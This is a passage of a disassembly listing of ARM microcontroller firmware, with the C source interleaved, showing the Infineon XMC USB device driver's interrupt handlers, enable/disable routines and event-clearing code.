 8004ecc:	f897 302f 	ldrb.w	r3, [r7, #47]	; 0x2f
 8004ed0:	2234      	movs	r2, #52	; 0x34
 8004ed2:	fb02 f303 	mul.w	r3, r2, r3
 8004ed6:	4a59      	ldr	r2, [pc, #356]	; (800503c <XMC_USBD_lHandleIEPInt+0x1b8>)
 8004ed8:	4413      	add	r3, r2
 8004eda:	627b      	str	r3, [r7, #36]	; 0x24
			inepint = (uint32_t)xmc_device.endpoint_in_register[ep_num]->diepint;
 8004edc:	f897 302f 	ldrb.w	r3, [r7, #47]	; 0x2f
 8004ee0:	4a56      	ldr	r2, [pc, #344]	; (800503c <XMC_USBD_lHandleIEPInt+0x1b8>)
 8004ee2:	336a      	adds	r3, #106	; 0x6a
 8004ee4:	f852 3023 	ldr.w	r3, [r2, r3, lsl #2]
 8004ee8:	689b      	ldr	r3, [r3, #8]
 8004eea:	623b      	str	r3, [r7, #32]
      diepint.d32 = inepint &
      ((((uint32_t)((uint32_t)xmc_device.device_register->dtknqr4_fifoemptymsk >> ep->address_u.address_st.number) &
 8004eec:	4b53      	ldr	r3, [pc, #332]	; (800503c <XMC_USBD_lHandleIEPInt+0x1b8>)
 8004eee:	f8d3 31a4 	ldr.w	r3, [r3, #420]	; 0x1a4
 8004ef2:	6b5b      	ldr	r3, [r3, #52]	; 0x34
 8004ef4:	6a7a      	ldr	r2, [r7, #36]	; 0x24
 8004ef6:	7812      	ldrb	r2, [r2, #0]
 8004ef8:	f3c2 0203 	ubfx	r2, r2, #0, #4
 8004efc:	b2d2      	uxtb	r2, r2
 8004efe:	40d3      	lsrs	r3, r2
                     0x1U) << 7U) | (uint32_t)diepmsk.d32);
 8004f00:	01db      	lsls	r3, r3, #7
 8004f02:	f003 0280 	and.w	r2, r3, #128	; 0x80
 8004f06:	693b      	ldr	r3, [r7, #16]
 8004f08:	431a      	orrs	r2, r3
      diepint.d32 = inepint &
 8004f0a:	6a3b      	ldr	r3, [r7, #32]
 8004f0c:	4013      	ands	r3, r2
 8004f0e:	60fb      	str	r3, [r7, #12]
      if(obj->usbd_transfer_mode == XMC_USBD_USE_DMA)
 8004f10:	687b      	ldr	r3, [r7, #4]
 8004f12:	7b5b      	ldrb	r3, [r3, #13]
 8004f14:	2b00      	cmp	r3, #0
 8004f16:	d107      	bne.n	8004f28 <XMC_USBD_lHandleIEPInt+0xa4>
      {
        dieptsiz.d32 = xmc_device.endpoint_in_register[ep_num]->dieptsiz;
 8004f18:	f897 302f 	ldrb.w	r3, [r7, #47]	; 0x2f
 8004f1c:	4a47      	ldr	r2, [pc, #284]	; (800503c <XMC_USBD_lHandleIEPInt+0x1b8>)
 8004f1e:	336a      	adds	r3, #106	; 0x6a
 8004f20:	f852 3023 	ldr.w	r3, [r2, r3, lsl #2]
 8004f24:	691b      	ldr	r3, [r3, #16]
 8004f26:	60bb      	str	r3, [r7, #8]
      }
      if(obj->usbd_transfer_mode == XMC_USBD_USE_FIFO)
 8004f28:	687b      	ldr	r3, [r7, #4]
 8004f2a:	7b5b      	ldrb	r3, [r3, #13]
 8004f2c:	2b01      	cmp	r3, #1
 8004f2e:	d115      	bne.n	8004f5c <XMC_USBD_lHandleIEPInt+0xd8>
      {
        if (diepint.b.emptyintr)
 8004f30:	7b3b      	ldrb	r3, [r7, #12]
 8004f32:	f023 037f 	bic.w	r3, r3, #127	; 0x7f
 8004f36:	b2db      	uxtb	r3, r3
 8004f38:	2b00      	cmp	r3, #0
 8004f3a:	d00f      	beq.n	8004f5c <XMC_USBD_lHandleIEPInt+0xd8>
        {
          uint32_t bytes;
          bytes = XMC_USBD_lWriteFifo(ep);
 8004f3c:	6a78      	ldr	r0, [r7, #36]	; 0x24
 8004f3e:	f7ff fb1b 	bl	8004578 <XMC_USBD_lWriteFifo>
 8004f42:	61f8      	str	r0, [r7, #28]
          ep->xferCount += bytes;
 8004f44:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8004f46:	6ada      	ldr	r2, [r3, #44]	; 0x2c
 8004f48:	69fb      	ldr	r3, [r7, #28]
 8004f4a:	441a      	add	r2, r3
 8004f4c:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8004f4e:	62da      	str	r2, [r3, #44]	; 0x2c
          ep->xferBuffer += bytes;
 8004f50:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8004f52:	6a5a      	ldr	r2, [r3, #36]	; 0x24
 8004f54:	69fb      	ldr	r3, [r7, #28]
 8004f56:	441a      	add	r2, r3
 8004f58:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8004f5a:	625a      	str	r2, [r3, #36]	; 0x24
        }
      }
      if (diepint.b.xfercompl)
 8004f5c:	7b3b      	ldrb	r3, [r7, #12]
 8004f5e:	f003 0301 	and.w	r3, r3, #1
 8004f62:	b2db      	uxtb	r3, r3
 8004f64:	2b00      	cmp	r3, #0
 8004f66:	d04e      	beq.n	8005006 <XMC_USBD_lHandleIEPInt+0x182>
      {
        if(obj->usbd_transfer_mode == XMC_USBD_USE_DMA)
 8004f68:	687b      	ldr	r3, [r7, #4]
 8004f6a:	7b5b      	ldrb	r3, [r3, #13]
 8004f6c:	2b00      	cmp	r3, #0
 8004f6e:	d11d      	bne.n	8004fac <XMC_USBD_lHandleIEPInt+0x128>
        {
          /* update xfer values */
          if ((dieptsiz.b.pktcnt == 0U) && (dieptsiz.b.xfersize == 0U))
 8004f70:	897a      	ldrh	r2, [r7, #10]
 8004f72:	f641 73f8 	movw	r3, #8184	; 0x1ff8
 8004f76:	4013      	ands	r3, r2
 8004f78:	b29b      	uxth	r3, r3
 8004f7a:	2b00      	cmp	r3, #0
 8004f7c:	d116      	bne.n	8004fac <XMC_USBD_lHandleIEPInt+0x128>
 8004f7e:	68bb      	ldr	r3, [r7, #8]
 8004f80:	f3c3 0312 	ubfx	r3, r3, #0, #19
 8004f84:	2b00      	cmp	r3, #0
 8004f86:	d111      	bne.n	8004fac <XMC_USBD_lHandleIEPInt+0x128>
          {
            uint32_t Bytes = ep->xferLength - ep->xferCount;
 8004f88:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8004f8a:	6a9a      	ldr	r2, [r3, #40]	; 0x28
 8004f8c:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8004f8e:	6adb      	ldr	r3, [r3, #44]	; 0x2c
 8004f90:	1ad3      	subs	r3, r2, r3
 8004f92:	61bb      	str	r3, [r7, #24]
            ep->xferCount += Bytes;
 8004f94:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8004f96:	6ada      	ldr	r2, [r3, #44]	; 0x2c
 8004f98:	69bb      	ldr	r3, [r7, #24]
 8004f9a:	441a      	add	r2, r3
 8004f9c:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8004f9e:	62da      	str	r2, [r3, #44]	; 0x2c
            ep->xferBuffer += Bytes;
 8004fa0:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8004fa2:	6a5a      	ldr	r2, [r3, #36]	; 0x24
 8004fa4:	69bb      	ldr	r3, [r7, #24]
 8004fa6:	441a      	add	r2, r3
 8004fa8:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8004faa:	625a      	str	r2, [r3, #36]	; 0x24
          }
        }
        if (ep->xferTotal==ep->xferLength)
 8004fac:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8004fae:	6b1a      	ldr	r2, [r3, #48]	; 0x30
 8004fb0:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8004fb2:	6a9b      	ldr	r3, [r3, #40]	; 0x28
 8004fb4:	429a      	cmp	r2, r3
 8004fb6:	d123      	bne.n	8005000 <XMC_USBD_lHandleIEPInt+0x17c>
        {
          ep->inInUse = 0U;
 8004fb8:	6a7a      	ldr	r2, [r7, #36]	; 0x24
 8004fba:	6853      	ldr	r3, [r2, #4]
 8004fbc:	f36f 03c3 	bfc	r3, #3, #1
 8004fc0:	6053      	str	r3, [r2, #4]
          if(obj->usbd_transfer_mode == XMC_USBD_USE_FIFO)
 8004fc2:	687b      	ldr	r3, [r7, #4]
 8004fc4:	7b5b      	ldrb	r3, [r3, #13]
 8004fc6:	2b01      	cmp	r3, #1
 8004fc8:	d10e      	bne.n	8004fe8 <XMC_USBD_lHandleIEPInt+0x164>
          {
            /* mask fifo empty interrupt */
            xmc_device.device_register->dtknqr4_fifoemptymsk =
            (uint32_t)(xmc_device.device_register->dtknqr4_fifoemptymsk & ~(((uint32_t)1U << ep_num)));
 8004fca:	4b1c      	ldr	r3, [pc, #112]	; (800503c <XMC_USBD_lHandleIEPInt+0x1b8>)
 8004fcc:	f8d3 31a4 	ldr.w	r3, [r3, #420]	; 0x1a4
 8004fd0:	6b59      	ldr	r1, [r3, #52]	; 0x34
 8004fd2:	f897 302f 	ldrb.w	r3, [r7, #47]	; 0x2f
 8004fd6:	2201      	movs	r2, #1
 8004fd8:	fa02 f303 	lsl.w	r3, r2, r3
 8004fdc:	43da      	mvns	r2, r3
            xmc_device.device_register->dtknqr4_fifoemptymsk =
 8004fde:	4b17      	ldr	r3, [pc, #92]	; (800503c <XMC_USBD_lHandleIEPInt+0x1b8>)
 8004fe0:	f8d3 31a4 	ldr.w	r3, [r3, #420]	; 0x1a4
            (uint32_t)(xmc_device.device_register->dtknqr4_fifoemptymsk & ~(((uint32_t)1U << ep_num)));
 8004fe4:	400a      	ands	r2, r1
            xmc_device.device_register->dtknqr4_fifoemptymsk =
 8004fe6:	635a      	str	r2, [r3, #52]	; 0x34
          }
          xmc_device.EndpointEvent_cb(0x80U | ep_num,XMC_USBD_EP_EVENT_IN);
 8004fe8:	4b14      	ldr	r3, [pc, #80]	; (800503c <XMC_USBD_lHandleIEPInt+0x1b8>)
 8004fea:	f8d3 3204 	ldr.w	r3, [r3, #516]	; 0x204
 8004fee:	f897 202f 	ldrb.w	r2, [r7, #47]	; 0x2f
 8004ff2:	f062 027f 	orn	r2, r2, #127	; 0x7f
 8004ff6:	b2d2      	uxtb	r2, r2
 8004ff8:	2102      	movs	r1, #2
 8004ffa:	4610      	mov	r0, r2
 8004ffc:	4798      	blx	r3
 8004ffe:	e002      	b.n	8005006 <XMC_USBD_lHandleIEPInt+0x182>
        }
        else
        {
          /* start next step of transfer */
          XMC_USBD_lStartWriteXfer(ep);
 8005000:	6a78      	ldr	r0, [r7, #36]	; 0x24
 8005002:	f7ff fc91 	bl	8004928 <XMC_USBD_lStartWriteXfer>
        }

      }

      XMC_USBD_ClearEventINEP((uint32_t)diepint.d32,ep_num);
 8005006:	68fb      	ldr	r3, [r7, #12]
 8005008:	f897 202f 	ldrb.w	r2, [r7, #47]	; 0x2f
 800500c:	4611      	mov	r1, r2
 800500e:	4618      	mov	r0, r3
 8005010:	f000 f994 	bl	800533c <XMC_USBD_ClearEventINEP>
    }
    ep_num++;
 8005014:	f897 302f 	ldrb.w	r3, [r7, #47]	; 0x2f
 8005018:	3301      	adds	r3, #1
 800501a:	f887 302f 	strb.w	r3, [r7, #47]	; 0x2f
  while ((uint16_t)mask >> ep_num)
 800501e:	8dba      	ldrh	r2, [r7, #44]	; 0x2c
 8005020:	f897 302f 	ldrb.w	r3, [r7, #47]	; 0x2f
 8005024:	fa42 f303 	asr.w	r3, r2, r3
 8005028:	2b00      	cmp	r3, #0
 800502a:	f47f af41 	bne.w	8004eb0 <XMC_USBD_lHandleIEPInt+0x2c>
  }
  XMC_USBD_ClearEvent(XMC_USBD_EVENT_INEP);
 800502e:	200e      	movs	r0, #14
 8005030:	f000 f908 	bl	8005244 <XMC_USBD_ClearEvent>
}
 8005034:	bf00      	nop
 8005036:	3730      	adds	r7, #48	; 0x30
 8005038:	46bd      	mov	sp, r7
 800503a:	bd80      	pop	{r7, pc}
 800503c:	20000a84 	.word	0x20000a84

08005040 <XMC_USBD_lHandleRxFLvl>:
 * @brief RX Fifo interrupt handler
 *
 * This function handles the interrupt, when the rx fifo is not empty anymore.
 */
static void XMC_USBD_lHandleRxFLvl(void) 
{
 8005040:	b580      	push	{r7, lr}
 8005042:	b082      	sub	sp, #8
 8005044:	af00      	add	r7, sp, #0
  device_grxsts_data_t data;	
  data.d32 = xmc_device.global_register->grxstsp;
 8005046:	4b1e      	ldr	r3, [pc, #120]	; (80050c0 <XMC_USBD_lHandleRxFLvl+0x80>)
 8005048:	f8d3 31a0 	ldr.w	r3, [r3, #416]	; 0x1a0
 800504c:	6a1b      	ldr	r3, [r3, #32]
 800504e:	607b      	str	r3, [r7, #4]

  switch (data.b.pktsts)
 8005050:	79bb      	ldrb	r3, [r7, #6]
 8005052:	f3c3 0343 	ubfx	r3, r3, #1, #4
 8005056:	b2db      	uxtb	r3, r3
 8005058:	3b01      	subs	r3, #1
 800505a:	2b05      	cmp	r3, #5
 800505c:	d82a      	bhi.n	80050b4 <XMC_USBD_lHandleRxFLvl+0x74>
 800505e:	a201      	add	r2, pc, #4	; (adr r2, 8005064 <XMC_USBD_lHandleRxFLvl+0x24>)
 8005060:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 8005064:	080050b5 	.word	0x080050b5
 8005068:	0800507d 	.word	0x0800507d
 800506c:	080050b5 	.word	0x080050b5
 8005070:	080050b5 	.word	0x080050b5
 8005074:	080050b5 	.word	0x080050b5
 8005078:	08005099 	.word	0x08005099
    case XMC_USBD_GRXSTS_PKTSTS_GOUTNAK:
      break;
    case XMC_USBD_GRXSTS_PKTSTS_OUTCMPL:
      break;
    case XMC_USBD_GRXSTS_PKTSTS_OUTDATA:
      XMC_USBD_lReadFifo((uint32_t)data.b.epnum,(uint32_t)data.b.bcnt);
 800507c:	793b      	ldrb	r3, [r7, #4]
 800507e:	f3c3 0303 	ubfx	r3, r3, #0, #4
 8005082:	b2db      	uxtb	r3, r3
 8005084:	461a      	mov	r2, r3
 8005086:	88bb      	ldrh	r3, [r7, #4]
 8005088:	f3c3 130a 	ubfx	r3, r3, #4, #11
 800508c:	b29b      	uxth	r3, r3
 800508e:	4619      	mov	r1, r3
 8005090:	4610      	mov	r0, r2
 8005092:	f7ff f9fd 	bl	8004490 <XMC_USBD_lReadFifo>
      break;
 8005096:	e00e      	b.n	80050b6 <XMC_USBD_lHandleRxFLvl+0x76>
    case XMC_USBD_GRXSTS_PKTSTS_SETUP:
      XMC_USBD_lReadFifo((uint32_t)data.b.epnum,(uint32_t)data.b.bcnt);
 8005098:	793b      	ldrb	r3, [r7, #4]
 800509a:	f3c3 0303 	ubfx	r3, r3, #0, #4
 800509e:	b2db      	uxtb	r3, r3
 80050a0:	461a      	mov	r2, r3
 80050a2:	88bb      	ldrh	r3, [r7, #4]
 80050a4:	f3c3 130a 	ubfx	r3, r3, #4, #11
 80050a8:	b29b      	uxth	r3, r3
 80050aa:	4619      	mov	r1, r3
 80050ac:	4610      	mov	r0, r2
 80050ae:	f7ff f9ef 	bl	8004490 <XMC_USBD_lReadFifo>
      break;
 80050b2:	e000      	b.n	80050b6 <XMC_USBD_lHandleRxFLvl+0x76>
    case XMC_USBD_GRXSTS_PKTSTS_SETUPCMPL:
      break;
    default:
      break;
 80050b4:	bf00      	nop
	}
  /* no need to clear */
}
 80050b6:	bf00      	nop
 80050b8:	3708      	adds	r7, #8
 80050ba:	46bd      	mov	sp, r7
 80050bc:	bd80      	pop	{r7, pc}
 80050be:	bf00      	nop
 80050c0:	20000a84 	.word	0x20000a84

080050c4 <XMC_USBD_IRQHandler>:
 *
 * The handler first checks, which global interrupt has caused the interrupt
 * and then dispatches interrupt to the corresponding sub-handler.
 */
void XMC_USBD_IRQHandler(const XMC_USBD_t *const obj) 
{
 80050c4:	b580      	push	{r7, lr}
 80050c6:	b084      	sub	sp, #16
 80050c8:	af00      	add	r7, sp, #0
 80050ca:	6078      	str	r0, [r7, #4]
  gintmsk_data_t gintmsk;
  gintsts_data_t data;
	
  gintmsk.d32 = xmc_device.global_register->gintmsk;
 80050cc:	4b50      	ldr	r3, [pc, #320]	; (8005210 <XMC_USBD_IRQHandler+0x14c>)
 80050ce:	f8d3 31a0 	ldr.w	r3, [r3, #416]	; 0x1a0
 80050d2:	699b      	ldr	r3, [r3, #24]
 80050d4:	60fb      	str	r3, [r7, #12]
  data.d32 = xmc_device.global_register->gintsts & gintmsk.d32;
 80050d6:	4b4e      	ldr	r3, [pc, #312]	; (8005210 <XMC_USBD_IRQHandler+0x14c>)
 80050d8:	f8d3 31a0 	ldr.w	r3, [r3, #416]	; 0x1a0
 80050dc:	695a      	ldr	r2, [r3, #20]
 80050de:	68fb      	ldr	r3, [r7, #12]
 80050e0:	4013      	ands	r3, r2
 80050e2:	60bb      	str	r3, [r7, #8]
	
  if (data.b.sofintr)
 80050e4:	7a3b      	ldrb	r3, [r7, #8]
 80050e6:	f003 0308 	and.w	r3, r3, #8
 80050ea:	b2db      	uxtb	r3, r3
 80050ec:	2b00      	cmp	r3, #0
 80050ee:	d007      	beq.n	8005100 <XMC_USBD_IRQHandler+0x3c>
  {
    xmc_device.DeviceEvent_cb(XMC_USBD_EVENT_SOF);
 80050f0:	4b47      	ldr	r3, [pc, #284]	; (8005210 <XMC_USBD_IRQHandler+0x14c>)
 80050f2:	f8d3 3200 	ldr.w	r3, [r3, #512]	; 0x200
 80050f6:	2009      	movs	r0, #9
 80050f8:	4798      	blx	r3
    XMC_USBD_ClearEvent(XMC_USBD_EVENT_SOF);
 80050fa:	2009      	movs	r0, #9
 80050fc:	f000 f8a2 	bl	8005244 <XMC_USBD_ClearEvent>
  }
  if(obj->usbd_transfer_mode == XMC_USBD_USE_FIFO)
 8005100:	687b      	ldr	r3, [r7, #4]
 8005102:	7b5b      	ldrb	r3, [r3, #13]
 8005104:	2b01      	cmp	r3, #1
 8005106:	d119      	bne.n	800513c <XMC_USBD_IRQHandler+0x78>
  {
    if (data.b.rxstsqlvl)
 8005108:	7a3b      	ldrb	r3, [r7, #8]
 800510a:	f003 0310 	and.w	r3, r3, #16
 800510e:	b2db      	uxtb	r3, r3
 8005110:	2b00      	cmp	r3, #0
 8005112:	d013      	beq.n	800513c <XMC_USBD_IRQHandler+0x78>
    {
      /* Masked that interrupt so its only done once */
      gintmsk.b.rxstsqlvl = 0U;
 8005114:	7b3b      	ldrb	r3, [r7, #12]
 8005116:	f36f 1304 	bfc	r3, #4, #1
 800511a:	733b      	strb	r3, [r7, #12]
      xmc_device.global_register->gintmsk = gintmsk.d32;
 800511c:	4b3c      	ldr	r3, [pc, #240]	; (8005210 <XMC_USBD_IRQHandler+0x14c>)
 800511e:	f8d3 31a0 	ldr.w	r3, [r3, #416]	; 0x1a0
 8005122:	68fa      	ldr	r2, [r7, #12]
 8005124:	619a      	str	r2, [r3, #24]
      XMC_USBD_lHandleRxFLvl(); /* handle the interrupt */
 8005126:	f7ff ff8b 	bl	8005040 <XMC_USBD_lHandleRxFLvl>
      gintmsk.b.rxstsqlvl = 1U;
 800512a:	7b3b      	ldrb	r3, [r7, #12]
 800512c:	f043 0310 	orr.w	r3, r3, #16
 8005130:	733b      	strb	r3, [r7, #12]
      xmc_device.global_register->gintmsk = gintmsk.d32;
 8005132:	4b37      	ldr	r3, [pc, #220]	; (8005210 <XMC_USBD_IRQHandler+0x14c>)
 8005134:	f8d3 31a0 	ldr.w	r3, [r3, #416]	; 0x1a0
 8005138:	68fa      	ldr	r2, [r7, #12]
 800513a:	619a      	str	r2, [r3, #24]
    }
  }
  if (data.b.erlysuspend)
 800513c:	7a7b      	ldrb	r3, [r7, #9]
 800513e:	f003 0304 	and.w	r3, r3, #4
 8005142:	b2db      	uxtb	r3, r3
 8005144:	2b00      	cmp	r3, #0
 8005146:	d002      	beq.n	800514e <XMC_USBD_IRQHandler+0x8a>
  {
    XMC_USBD_ClearEvent(XMC_USBD_EVENT_EARLYSUSPEND);
 8005148:	200a      	movs	r0, #10
 800514a:	f000 f87b 	bl	8005244 <XMC_USBD_ClearEvent>
  }
  if (data.b.usbsuspend)
 800514e:	7a7b      	ldrb	r3, [r7, #9]
 8005150:	f003 0308 	and.w	r3, r3, #8
 8005154:	b2db      	uxtb	r3, r3
 8005156:	2b00      	cmp	r3, #0
 8005158:	d007      	beq.n	800516a <XMC_USBD_IRQHandler+0xa6>
  {
    xmc_device.DeviceEvent_cb(XMC_USBD_EVENT_SUSPEND);
 800515a:	4b2d      	ldr	r3, [pc, #180]	; (8005210 <XMC_USBD_IRQHandler+0x14c>)
 800515c:	f8d3 3200 	ldr.w	r3, [r3, #512]	; 0x200
 8005160:	2006      	movs	r0, #6
 8005162:	4798      	blx	r3
    XMC_USBD_ClearEvent(XMC_USBD_EVENT_SUSPEND);
 8005164:	2006      	movs	r0, #6
 8005166:	f000 f86d 	bl	8005244 <XMC_USBD_ClearEvent>
  }
  if (data.b.wkupintr)
 800516a:	7afb      	ldrb	r3, [r7, #11]
 800516c:	f023 037f 	bic.w	r3, r3, #127	; 0x7f
 8005170:	b2db      	uxtb	r3, r3
 8005172:	2b00      	cmp	r3, #0
 8005174:	d007      	beq.n	8005186 <XMC_USBD_IRQHandler+0xc2>
  {
    xmc_device.DeviceEvent_cb(XMC_USBD_EVENT_REMOTE_WAKEUP);
 8005176:	4b26      	ldr	r3, [pc, #152]	; (8005210 <XMC_USBD_IRQHandler+0x14c>)
 8005178:	f8d3 3200 	ldr.w	r3, [r3, #512]	; 0x200
 800517c:	2008      	movs	r0, #8
 800517e:	4798      	blx	r3
    XMC_USBD_ClearEvent(XMC_USBD_EVENT_REMOTE_WAKEUP);
 8005180:	2008      	movs	r0, #8
 8005182:	f000 f85f 	bl	8005244 <XMC_USBD_ClearEvent>
  }
  if (data.b.sessreqintr)
 8005186:	7afb      	ldrb	r3, [r7, #11]
 8005188:	f003 0340 	and.w	r3, r3, #64	; 0x40
 800518c:	b2db      	uxtb	r3, r3
 800518e:	2b00      	cmp	r3, #0
 8005190:	d00e      	beq.n	80051b0 <XMC_USBD_IRQHandler+0xec>
  {
    xmc_device.IsPowered = 1U;
 8005192:	4a1f      	ldr	r2, [pc, #124]	; (8005210 <XMC_USBD_IRQHandler+0x14c>)
 8005194:	f892 31fe 	ldrb.w	r3, [r2, #510]	; 0x1fe
 8005198:	f043 0304 	orr.w	r3, r3, #4
 800519c:	f882 31fe 	strb.w	r3, [r2, #510]	; 0x1fe
    xmc_device.DeviceEvent_cb(XMC_USBD_EVENT_POWER_ON);
 80051a0:	4b1b      	ldr	r3, [pc, #108]	; (8005210 <XMC_USBD_IRQHandler+0x14c>)
 80051a2:	f8d3 3200 	ldr.w	r3, [r3, #512]	; 0x200
 80051a6:	2000      	movs	r0, #0
 80051a8:	4798      	blx	r3
    XMC_USBD_ClearEvent(XMC_USBD_EVENT_POWER_ON);
 80051aa:	2000      	movs	r0, #0
 80051ac:	f000 f84a 	bl	8005244 <XMC_USBD_ClearEvent>
  }
  if (data.b.usbreset)
 80051b0:	7a7b      	ldrb	r3, [r7, #9]
 80051b2:	f003 0310 	and.w	r3, r3, #16
 80051b6:	b2db      	uxtb	r3, r3
 80051b8:	2b00      	cmp	r3, #0
 80051ba:	d002      	beq.n	80051c2 <XMC_USBD_IRQHandler+0xfe>
  {
    XMC_USBD_lHandleUSBReset(obj);
 80051bc:	6878      	ldr	r0, [r7, #4]
 80051be:	f7ff fc7f 	bl	8004ac0 <XMC_USBD_lHandleUSBReset>
  }
  if (data.b.enumdone)
 80051c2:	7a7b      	ldrb	r3, [r7, #9]
 80051c4:	f003 0320 	and.w	r3, r3, #32
 80051c8:	b2db      	uxtb	r3, r3
 80051ca:	2b00      	cmp	r3, #0
 80051cc:	d001      	beq.n	80051d2 <XMC_USBD_IRQHandler+0x10e>
  {
    XMC_USBD_lHandleEnumDone();
 80051ce:	f7ff fd43 	bl	8004c58 <XMC_USBD_lHandleEnumDone>
  }
  if (data.b.inepint)
 80051d2:	7abb      	ldrb	r3, [r7, #10]
 80051d4:	f003 0304 	and.w	r3, r3, #4
 80051d8:	b2db      	uxtb	r3, r3
 80051da:	2b00      	cmp	r3, #0
 80051dc:	d002      	beq.n	80051e4 <XMC_USBD_IRQHandler+0x120>
  {
    XMC_USBD_lHandleIEPInt(obj);
 80051de:	6878      	ldr	r0, [r7, #4]
 80051e0:	f7ff fe50 	bl	8004e84 <XMC_USBD_lHandleIEPInt>
  }
  if (data.b.outepintr)
 80051e4:	7abb      	ldrb	r3, [r7, #10]
 80051e6:	f003 0308 	and.w	r3, r3, #8
 80051ea:	b2db      	uxtb	r3, r3
 80051ec:	2b00      	cmp	r3, #0
 80051ee:	d002      	beq.n	80051f6 <XMC_USBD_IRQHandler+0x132>
  {
		XMC_USBD_lHandleOEPInt(obj);
 80051f0:	6878      	ldr	r0, [r7, #4]
 80051f2:	f7ff fd6d 	bl	8004cd0 <XMC_USBD_lHandleOEPInt>
  }
	if (data.b.otgintr)
 80051f6:	7a3b      	ldrb	r3, [r7, #8]
 80051f8:	f003 0304 	and.w	r3, r3, #4
 80051fc:	b2db      	uxtb	r3, r3
 80051fe:	2b00      	cmp	r3, #0
 8005200:	d001      	beq.n	8005206 <XMC_USBD_IRQHandler+0x142>
  {
	  XMC_USBD_lHandleOTGInt();
 8005202:	f7ff fd05 	bl	8004c10 <XMC_USBD_lHandleOTGInt>
  }

}
 8005206:	bf00      	nop
 8005208:	3710      	adds	r7, #16
 800520a:	46bd      	mov	sp, r7
 800520c:	bd80      	pop	{r7, pc}
 800520e:	bf00      	nop
 8005210:	20000a84 	.word	0x20000a84

08005214 <XMC_USBD_Enable>:
 *******************************************************************************/
/**
 * Enables the USB0 module
 **/
void XMC_USBD_Enable(void) 
{
 8005214:	b580      	push	{r7, lr}
 8005216:	af00      	add	r7, sp, #0
#if defined(CLOCK_GATING_SUPPORTED)
  XMC_SCU_CLOCK_UngatePeripheralClock(XMC_SCU_PERIPHERAL_CLOCK_USB0);
#endif
  /* Reset and power up */
  XMC_SCU_RESET_DeassertPeripheralReset(XMC_SCU_PERIPHERAL_RESET_USB0);
 8005218:	4803      	ldr	r0, [pc, #12]	; (8005228 <XMC_USBD_Enable+0x14>)
 800521a:	f7fc f92d 	bl	8001478 <XMC_SCU_RESET_DeassertPeripheralReset>
  XMC_SCU_POWER_EnableUsb();
 800521e:	f7fc fd11 	bl	8001c44 <XMC_SCU_POWER_EnableUsb>
}
 8005222:	bf00      	nop
 8005224:	bd80      	pop	{r7, pc}
 8005226:	bf00      	nop
 8005228:	20000080 	.word	0x20000080

0800522c <XMC_USBD_Disable>:

/**
 * Disables the USB0 module
 **/
void XMC_USBD_Disable(void) 
{
 800522c:	b580      	push	{r7, lr}
 800522e:	af00      	add	r7, sp, #0
  /* Clear Reset and power up */
  XMC_SCU_RESET_AssertPeripheralReset(XMC_SCU_PERIPHERAL_RESET_USB0);
 8005230:	4803      	ldr	r0, [pc, #12]	; (8005240 <XMC_USBD_Disable+0x14>)
 8005232:	f7fc f903 	bl	800143c <XMC_SCU_RESET_AssertPeripheralReset>
#if defined(CLOCK_GATING_SUPPORTED)
  XMC_SCU_CLOCK_GatePeripheralClock(XMC_SCU_PERIPHERAL_CLOCK_USB0);
#endif
  XMC_SCU_POWER_DisableUsb();
 8005236:	f7fc fd13 	bl	8001c60 <XMC_SCU_POWER_DisableUsb>
}
 800523a:	bf00      	nop
 800523c:	bd80      	pop	{r7, pc}
 800523e:	bf00      	nop
 8005240:	20000080 	.word	0x20000080

08005244 <XMC_USBD_ClearEvent>:

/**
 * Clear the USB device event
 **/
void XMC_USBD_ClearEvent(const XMC_USBD_EVENT_t event) 
{
 8005244:	b480      	push	{r7}
 8005246:	b085      	sub	sp, #20
 8005248:	af00      	add	r7, sp, #0
 800524a:	4603      	mov	r3, r0
 800524c:	71fb      	strb	r3, [r7, #7]
  gintsts_data_t clear;
  clear.d32 = 0U;
 800524e:	2300      	movs	r3, #0
 8005250:	60fb      	str	r3, [r7, #12]
  switch(event)
 8005252:	79fb      	ldrb	r3, [r7, #7]
 8005254:	2b0d      	cmp	r3, #13
 8005256:	d84c      	bhi.n	80052f2 <XMC_USBD_ClearEvent+0xae>
 8005258:	a201      	add	r2, pc, #4	; (adr r2, 8005260 <XMC_USBD_ClearEvent+0x1c>)
 800525a:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800525e:	bf00      	nop
 8005260:	08005299 	.word	0x08005299
 8005264:	080052f3 	.word	0x080052f3
 8005268:	080052f3 	.word	0x080052f3
 800526c:	080052f3 	.word	0x080052f3
 8005270:	080052a3 	.word	0x080052a3
 8005274:	080052f3 	.word	0x080052f3
 8005278:	080052ad 	.word	0x080052ad
 800527c:	080052b7 	.word	0x080052b7
 8005280:	080052c1 	.word	0x080052c1
 8005284:	080052cb 	.word	0x080052cb
 8005288:	080052d5 	.word	0x080052d5
 800528c:	080052df 	.word	0x080052df
 8005290:	080052f3 	.word	0x080052f3
 8005294:	080052e9 	.word	0x080052e9
  {
    case (XMC_USBD_EVENT_POWER_ON):
	  clear.b.sessreqintr = 1U;
 8005298:	7bfb      	ldrb	r3, [r7, #15]
 800529a:	f043 0340 	orr.w	r3, r3, #64	; 0x40
 800529e:	73fb      	strb	r3, [r7, #15]
	  break;
 80052a0:	e028      	b.n	80052f4 <XMC_USBD_ClearEvent+0xb0>
    case (XMC_USBD_EVENT_RESET):
	  clear.b.usbreset = 1U;
 80052a2:	7b7b      	ldrb	r3, [r7, #13]
 80052a4:	f043 0310 	orr.w	r3, r3, #16
 80052a8:	737b      	strb	r3, [r7, #13]
	  break;
 80052aa:	e023      	b.n	80052f4 <XMC_USBD_ClearEvent+0xb0>
    case (XMC_USBD_EVENT_SUSPEND):
	  clear.b.usbsuspend = 1U;
 80052ac:	7b7b      	ldrb	r3, [r7, #13]
 80052ae:	f043 0308 	orr.w	r3, r3, #8
 80052b2:	737b      	strb	r3, [r7, #13]
	  break;
